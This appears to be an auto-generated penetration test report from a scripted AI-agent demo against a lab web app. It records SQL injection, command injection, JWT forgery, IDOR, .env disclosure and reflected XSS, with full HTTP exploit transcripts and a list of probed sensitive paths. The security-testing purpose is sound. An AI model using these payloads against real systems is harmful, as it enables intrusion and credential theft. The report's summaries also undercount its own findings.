# Penetration Test Report - 20261116-015041-192.168.223.221

- **Target:** `192.168.223.221` (20261116-015041-192.168.223.221)
- **Date:** 2026-11-16 01:50:41
- **Duration:** 3.5s
- **Agent model:** scripted-demo
- **Model cost:** not priced - cache reads at 10% and cache writes at 125% of input, per models.json; 3 agent(s) ran a model with no line in models.json and contribute no number; no agent had a price, so there is no total
- **Argus version:** 1.0.0
- **Requests sent:** 74

## Executive summary

Team demo: recon mapped the surface, exploit verified SQLi, XSS, IDOR and info disclosure with verbatim evidence.

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 1 |
| Medium | 2 |

| Proof grade | Count | Meaning |
|---|---|---|
| **proven** | 5 | the class-specific artifact and its control are on record |
| **candidate** | 1 | a real signal; a named check is still missing |

| OWASP Top 10 (2021) | Findings |
|---|---|
| A01 Broken Access Control | F04, F05 |
| A02 Cryptographic Failures | F06 |
| A03 Injection | F01, F02, F03 |

## Engagement constraints

- **Scope hosts:** (target only)
- **Excluded paths:** none
- **Budgets:** 15 turns, 400 requests, 0 rps
- **Proxy:** no · **TLS verify:** no
- **Tool surface:** all


## Findings

### F01 - SQL injection in /item id parameter

- **Severity:** Critical
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Category:** sqli · **proof: proven**
- **CWE:** `CWE-89`
- **OWASP:** A03 Injection
- **Endpoint:** `http://192.168.223.221:8777/item?id=1`
- **Evidence:** r2, r3, r25

**Description**  
id is interpolated into the query; a UNION read limited to five rows returns users.username and users.password.

**Proof (verbatim excerpt)**  
```
admin - $s3cr3t-admin-pw
```

**Remediation**  
Use parameterized queries.

**Proof grade: proven**  

_Requirement for sqli:_ the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r25
- [x] data store fingerprinted - sqlite3.OperationalError in r3
- [x] the query named its target - users in r25
- [x] the rows are not what the page serves anyway - admin - $s3cr3t-admin-pw in r25 and in no control
- [x] rows returned, not an error message - quoted from r25
- [x] extraction stayed minimal

<details><summary>Transcript r2: GET http://192.168.223.221:8777/item?id=1 -> 200</summary>

```http
GET http://192.168.223.221:8777/item?id=1
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:42 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 58

<html><body><ul><li>widget - $9.99</li></ul></body></html>
```
</details>

<details><summary>Transcript r3: GET http://192.168.223.221:8777/item?id=1%27 -> 500</summary>

```http
GET http://192.168.223.221:8777/item?id=1%27
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/500
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:42 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 102

<html><body>sqlite3.OperationalError: unrecognized token: "'1''" near "1'": syntax error</body></html>
```
</details>

<details><summary>Transcript r25: GET http://192.168.223.221:8777/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+- -> 200</summary>

```http
GET http://192.168.223.221:8777/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+-
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:43 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 139

<html><body><ul><li>admin - $s3cr3t-admin-pw</li><li>alice - $alice-pw</li><li>bob - $bob-pw</li><li>widget - $9.99</li></ul></body></html>
```
</details>

### F02 - OS command injection in /ping host parameter

- **Severity:** Critical
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Category:** rce · **proof: proven**
- **CWE:** `CWE-78`
- **OWASP:** A03 Injection
- **Endpoint:** `http://192.168.223.221:8777/ping?host=127.0.0.1`
- **Evidence:** r28

**Description**  
`id; echo <nonce>` returns the server's identity line and the nonce - computed by the target.

**Proof (verbatim excerpt)**  
```
uid=1000(lab)
```

**Remediation**  
Exec with an argv list; validate the host.

**Proof grade: proven**  

_Requirement for rce:_ the output of `id; echo <nonce>` returned by the target, with the nonce tying the output to the probe

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r28
- [x] a benign command was sent - exchange r28
- [x] identity output returned by the target - 'uid=1000(lab)' in r28
- [x] the quoted bytes are the command output - 'uid=1000(lab)' carries the identity line
- [x] the probe nonce came back in the output - 'argus9nqzg1rk' in r28
- [x] proof command stayed benign

<details><summary>Transcript r28: GET http://192.168.223.221:8777/ping?host=127.0.0.1%3B+id%3B+echo+argus9nqzg1rk -> 200</summary>

```http
GET http://192.168.223.221:8777/ping?host=127.0.0.1%3B+id%3B+echo+argus9nqzg1rk
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:43 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 215

<html><body><pre>PING 127.0.0.1: 4 packets, 0% loss
uid=1000(lab) gid=1000(lab) groups=1000(lab),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)

argus9nqzg1rk</pre></body></html>
```
</details>

### F06 - JWT weak secret: forged admin token accepted

- **Severity:** Critical
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
- **Category:** jwt · **proof: proven**
- **CWE:** `CWE-347`
- **OWASP:** A02 Cryptographic Failures
- **Endpoint:** `http://192.168.223.221:8777/api/me`
- **Evidence:** r75, r74, r73

**Description**  
The secret 'secret123' is dictionary-weak: a forged admin token is accepted, while the same request with a broken signature is refused 401.

**Proof (verbatim excerpt)**  
```
"role": "admin"
```

**Remediation**  
Rotate to a high-entropy secret; prefer asymmetric signing.

**Proof grade: proven**  

_Requirement for jwt:_ a credential this system minted, accepted on a privileged resource with its claims echoed back, and another credential refused on the same endpoint

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r74
- [x] this system minted the credential - jwt_forge r73 set ['role', 'user'], echoed 'admin', and r74 carried that token
- [x] a forged credential was accepted - 192.168.223.221/api/me returned 200 with a credential
- [x] the same endpoint refuses another credential - 192.168.223.221/api/me answered 401 to a credentialed request

<details><summary>Transcript r75: GET http://192.168.223.221:8777/api/me -> 401</summary>

```http
GET http://192.168.223.221:8777/api/me
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)
authorization: Bearer •••redacted•••

HTTP/401
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:45 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 22

{"error": "bad token"}
```
</details>

<details><summary>Transcript r74: GET http://192.168.223.221:8777/api/me -> 200</summary>

```http
GET http://192.168.223.221:8777/api/me
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)
authorization: Bearer •••redacted•••

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:45 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 93

{"ok": true, "claims": {"sub": "alice", "role": "admin", "iat": 1794811842, "user": "admin"}}
```
</details>

### F04 - IDOR: /api/user/<id> serves any user

- **Severity:** High
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Category:** idor · **proof: proven**
- **CWE:** `CWE-639`
- **OWASP:** A01 Broken Access Control
- **Endpoint:** `http://192.168.223.221:8777/api/user/2`
- **Evidence:** r30, r32

**Description**  
Reading id 2 returns alice, reading id 1 returns the admin record, with no credential telling the two requests apart.

**Proof (verbatim excerpt)**  
```
"username": "admin"
```

**Remediation**  
Enforce per-object ownership checks.

**Proof grade: proven**  

_Requirement for idor:_ one actor reaching another's subject on the same endpoint, with subject-identifying data and nothing entitling the caller to it

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r32
- [x] two distinct object references on one endpoint - ['2'] vs ['1'] on 192.168.223.221/api/user/{id}
- [x] another subject's data returned - present in r32, absent from r30
- [x] the data identifies a subject
- [x] the caller was not entitled to it - no credential was presented and subject data came back

<details><summary>Transcript r30: GET http://192.168.223.221:8777/api/user/2 -> 200</summary>

```http
GET http://192.168.223.221:8777/api/user/2
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:43 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 74

{"id": 2, "username": "alice", "role": "user", "email": "alice@lab.local"}
```
</details>

<details><summary>Transcript r32: GET http://192.168.223.221:8777/api/user/1 -> 200</summary>

```http
GET http://192.168.223.221:8777/api/user/1
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:43 GMT
content-type: application/json
x-powered-by: LabVuln/1.0
content-length: 75

{"id": 1, "username": "admin", "role": "admin", "email": "admin@lab.local"}
```
</details>

### F05 - Exposed /.env and /.git/HEAD at web root

- **Severity:** Medium
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Category:** info-disclosure · **proof: proven**
- **CWE:** `CWE-200`
- **OWASP:** A01 Broken Access Control
- **Endpoint:** `http://192.168.223.221:8777/.env`
- **Evidence:** r37

**Description**  
Sensitive paths served publicly - credentials and VCS metadata leak.

**Proof (verbatim excerpt)**  
```
SECRET_KEY=lab-secret-0123
```

**Remediation**  
Deny dotfile/VCS paths; rotate exposed secrets.

**Proof grade: proven**  

_Requirement for disclosure:_ the credential or source observed in a response, quoted as the bytes that leaked

- [x] proof read from the wire
- [x] the target produced the quoted bytes - from r37
- [x] a credential-shaped secret was observed - SECRET_KEY=lab-secret-01...
- [x] it came from a response, not from the request - in r37

<details><summary>Transcript r37: GET http://192.168.223.221:8777/.env -> 200</summary>

```http
GET http://192.168.223.221:8777/.env
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:43 GMT
content-type: text/plain
x-powered-by: LabVuln/1.0
content-length: 67

DB_HOST=db.internal
DB_PASSWORD=hunter2
SECRET_KEY=lab-secret-0123

```
</details>

### F03 - Reflected XSS in /search q parameter

- **Severity:** Medium
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
- **Category:** xss · **proof: candidate**
- **CWE:** `CWE-79`
- **OWASP:** A03 Injection
- **Endpoint:** `http://192.168.223.221:8777/search?q=x`
- **Evidence:** r29

**Description**  
Canary chars reflect unescaped in html context.

**Proof (verbatim excerpt)**  
```
<>'"&=/
```

**Remediation**  
Output-encode by context; add CSP.

**Proof grade: candidate**  

_Requirement for xss:_ a headless browser executing the payload and reporting the probe nonce

- [x] proof read from the wire
- [x] the target produced the quoted bytes
- [x] payload reflected unencoded into HTML - '<>"\'' survived into r29
- [ ] a real browser executed it - this system has no browser, so execution is not provable here. Drive one over mcp_call and cite the nonce it reports, or leave this a candidate and say so in the report

<details><summary>Transcript r29: GET http://192.168.223.221:8777/search?q=xl0x97bff%3C%3E%27%22%26%3D%2F -> 200</summary>

```http
GET http://192.168.223.221:8777/search?q=xl0x97bff%3C%3E%27%22%26%3D%2F
host: 192.168.223.221:8777
accept: */*
accept-encoding: gzip, deflate, br, zstd
connection: keep-alive
user-agent: Argus/1.0 (authorized pentest)

HTTP/200
server: LabVuln/1.0 Python/3.10.12
date: Mon, 16 Nov 2026 06:50:43 GMT
content-type: text/html; charset=utf-8
x-powered-by: LabVuln/1.0
content-length: 55

<html><body>Results for: xl0x97bff<>'"&=/</body></html>
```
</details>

## Agent metrics

| Agent | Role | Status | Turns | Requests | Tokens in/out | LLM calls | Findings |
|---|---|---|---|---|---|---|---|
| lead | lead | done | 2 | 0 | 0/0 | 2 | 0 |
| recon-1 | recon | done | 2 | 10 | 0/0 | 2 | 0 |
| exploit-1 | exploit | done | 16 | 64 | 0/0 | 16 | 6 |

**Time to first finding:** 0.8s


## Test coverage

| Tool | Requests |
|---|---|
| crawl | 7 |
| fingerprint | 3 |
| http_request | 3 |
| probe_cmdi | 3 |
| probe_disclosure | 38 |
| probe_idor | 4 |
| probe_reflection | 1 |
| probe_sqli | 15 |

**Probe families run:** probe_cmdi, probe_disclosure, probe_idor, probe_reflection, probe_sqli

**Endpoints exercised (54):**

- `GET /`
- `GET /.DS_Store`
- `GET /.aws/credentials`
- `GET /.env`
- `GET /.git/HEAD`
- `GET /.git/config`
- `GET /.gitignore`
- `GET /.npmrc`
- `GET /.svn/entries`
- `GET /WEB-INF/web.xml`
- `GET /actuator/env`
- `GET /actuator/heapdump`
- `GET /actuator/info`
- `GET /actuator/mappings`
- `GET /adminer.php`
- `GET /api-docs`
- `GET /api/me`
- `GET /api/user/0`
- `GET /api/user/1`
- `GET /api/user/2`
- `GET /api/user/3`
- `GET /arg404jdad9ogl`
- `GET /backup.zip`
- `GET /composer.json`
- `GET /console`
- `GET /debug`
- `GET /debug/pprof/`
- `GET /debug/vars`
- `GET /docker-compose.yml`
- `GET /download?file`
- `GET /elmah.axd`
- `GET /health`
- `GET /hello?name`
- `GET /item?id`
- `GET /manager/html`
- `GET /metrics`
- `GET /nginx_status`
- `GET /package.json`
- `GET /phpinfo.php`
- `GET /phpmyadmin/`
- `GET /ping?host`
- `GET /redirect?next`
- `GET /robots.txt`
- `GET /search?q`
- `GET /server-info`
- `GET /server-status`
- `GET /sitemap.xml`
- `GET /static/app.js`
- `GET /swagger.json`
- `GET /token?user`
- `GET /trace`
- `GET /v2/api-docs`
- `GET /web.config`
- `GET /wp-config.php~`

## Methodology

Autonomous agent run: recon (fingerprint, crawl, js_recon) -> input
mapping -> hypothesis-driven probes (matched true/false pairs,
baseline-diffed) -> verification -> evidence-gated findings.
The complete request/response transcript is in `transcript.jsonl`,
(75 entries). Working notes are in `notes.md`.

Every finding is graded against the proof requirement for its class
(`argus proof <class>`): **proven** means the class-specific artifact
and its control are both on record; **candidate** means a real signal
with a named check still missing. A candidate is reported because it
is worth re-testing, not because it is a result.

_All findings cite verbatim response excerpts verified against the
recorded transcript at write time._

<details><summary>Appendix: agent working notes (audit)</summary>

```
# Working notes - http://192.168.223.221:8777

## Lead summary

Team demo: recon mapped the surface, exploit verified SQLi, XSS, IDOR and info disclosure with verbatim evidence.

- **[01:50:42 recon-1]** Python http.server lab; /item, /search, /api/user exposed.

## Agent summary (recon-1)

Surface mapped; leads seeded.

## Agent summary (exploit-1)

5/5 leads verified with verbatim evidence.


```
</details>